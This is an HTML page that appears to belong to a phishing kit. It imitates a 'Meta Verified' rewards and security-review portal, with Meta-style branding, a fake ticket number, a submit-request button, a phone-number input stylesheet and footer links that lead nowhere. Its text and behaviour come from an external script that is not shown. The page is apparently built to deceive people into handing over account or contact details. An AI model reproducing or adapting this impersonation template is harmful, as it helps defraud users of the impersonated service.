<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover">
    <title>Meta Verified - Rewards for you</title>
    <link rel="icon" href="./public/favicon-32x32.png">
    <link rel="stylesheet" href="./public/styles/tw-built.css">
    <link rel="stylesheet" href="./public/styles/style.css">
    <link rel="stylesheet" href="./public/styles/intl-tel-input.min.css">
</head>

<body class="min-h-screen w-full flex justify-center bg-cover bg-center bg-no-repeat lg:bg-fixed" style="background-image: url('./public/succes.jpg');">
    <div class="fixed inset-0 bg-white/78 pointer-events-none"></div>
    <div class="relative z-10 max-w-[1100px] w-full px-3 py-4 sm:px-4 sm:py-6 md:px-6 md:py-10">
        <div class="w-full bg-white border border-[#d9e2ef] rounded-xl sm:rounded-2xl shadow-[0_8px_30px_rgba(20,45,90,0.08)] overflow-hidden">
            <div class="px-4 py-4 sm:px-5 sm:py-5 md:px-8 md:py-7 border-b border-[#e9eef6] bg-gradient-to-r from-[#f7faff] to-[#f4fbff]">
                <div class="flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
                    <div class="flex items-start gap-3">
                        <div class="w-10 h-10 sm:w-11 sm:h-11 rounded-xl bg-[#e8f1ff] flex items-center justify-center shrink-0">
                            <img src="./public/tick.svg" class="w-5 h-5 sm:w-6 sm:h-6" alt="Security">
                        </div>
                        <div>
                            <img src="./public/logo-gray.svg" alt="Brand" class="h-4 sm:h-5 w-auto mb-1">
                            <h1 class="text-[24px] sm:text-[28px] md:text-[30px] leading-[1.15] font-bold text-[#1877f2]" data-i18n="mv_headline"></h1>
                            <p class="text-[14px] sm:text-[15px] mt-2 text-[#536b89]" data-i18n="mv_subtitle"></p>
                        </div>
                    </div>
                    <div class="bg-[#eef5ff] border border-[#d5e4ff] rounded-xl px-4 py-3 w-full md:w-auto">
                        <p class="text-[12px] font-semibold uppercase tracking-[0.06em] text-[#4a6288]" data-i18n="tracking_code_label"></p>
                        <p class="text-[15px] sm:text-[16px] font-semibold text-[#1f3f70] mt-1 break-all"><span data-i18n="ticket_label"></span> <span>#<span id="ticketId">XXXX-XXXX-XXXX</span></span></p>
                    </div>
                </div>
            </div>

            <div class="p-4 sm:p-5 md:p-8">
                <div class="grid grid-cols-1 xl:grid-cols-3 gap-4 sm:gap-5 md:gap-6">
                    <div class="xl:col-span-2 order-2 xl:order-1">
                        <div class="rounded-xl border border-[#e3eaf5] bg-[#fbfdff] p-5">
                            <h2 class="text-[17px] sm:text-[18px] font-semibold text-[#173154] mb-3" data-i18n="request_overview_title"></h2>
                            <p class="text-[14px] sm:text-[15px] leading-[1.55] text-[#2e4669]" data-i18n="mv_p1"></p>
                            <p class="text-[14px] sm:text-[15px] leading-[1.55] text-[#2e4669] mt-3" data-i18n="mv_p2"></p>
                        </div>

                        <div class="mt-4 sm:mt-5">
                            <h3 class="text-[17px] sm:text-[18px] font-semibold text-[#173154] mb-3" data-i18n="mv_guide_title"></h3>
                            <div class="space-y-2.5 sm:space-y-3">
                                <div class="rounded-lg border border-[#e4ebf7] bg-white px-4 py-3">
                                    <p class="text-[14px] sm:text-[15px] text-[#2d4568] leading-[1.5]" data-i18n="mv_rule1"></p>
                                </div>
                                <div class="rounded-lg border border-[#e4ebf7] bg-white px-4 py-3">
                                    <p class="text-[14px] sm:text-[15px] text-[#2d4568] leading-[1.5]" data-i18n="mv_rule2"></p>
                                </div>
                                <div class="rounded-lg border border-[#e4ebf7] bg-white px-4 py-3">
                                    <p class="text-[14px] sm:text-[15px] text-[#2d4568] leading-[1.5]" data-i18n="mv_rule3"></p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <aside class="xl:col-span-1 order-1 xl:order-2">
                        <div class="rounded-xl border border-[#d9e5f7] bg-[#f8fbff] p-4 sm:p-5 xl:sticky xl:top-4">
                            <div class="flex items-center gap-2 mb-3">
                                <img src="./public/tick.svg" class="w-5 h-5" alt="Status">
                                <p class="text-[14px] sm:text-[15px] font-semibold text-[#1d3e71]" data-i18n="review_status_ready"></p>
                            </div>
                            <p class="text-[13px] sm:text-[14px] leading-[1.5] text-[#486182] mb-4" data-i18n="review_status_desc"></p>
                            <button id="submitRequestBtn" class="w-full h-[44px] sm:h-[46px] rounded-full bg-[#1665d8] text-white font-semibold text-[15px] sm:text-[16px] hover:bg-[#0f57bf] transition-colors" data-i18n="mv_submit_button"></button>
                            <div class="mt-4 text-[11px] sm:text-[12px] text-[#637b9a] leading-[1.45]">
                                <p data-i18n="review_eta"></p>
                                <p class="mt-1" data-i18n="review_followup_note"></p>
                            </div>
                        </div>
                    </aside>
                </div>
            </div>
        </div>

        <div class="flex items-center text-center justify-center flex-wrap text-[11px] sm:text-xs mt-5 sm:mt-6 text-[#63708a] gap-x-4 gap-y-2">
            <a href="#" data-i18n="footer_help">Help Center</a>
            <a href="#" data-i18n="footer_policy">Privacy Policy</a>
            <a href="#" data-i18n="footer_terms">Terms of Service</a>
            <a href="#" data-i18n="footer_community">Community Standards</a>
            <a href="#">Security Portal © 2026</a>
        </div>
    </div>

    <div id="modalsContainer"></div>

    <script src="./public/js/bundle.js"></script>
</body>

</html>
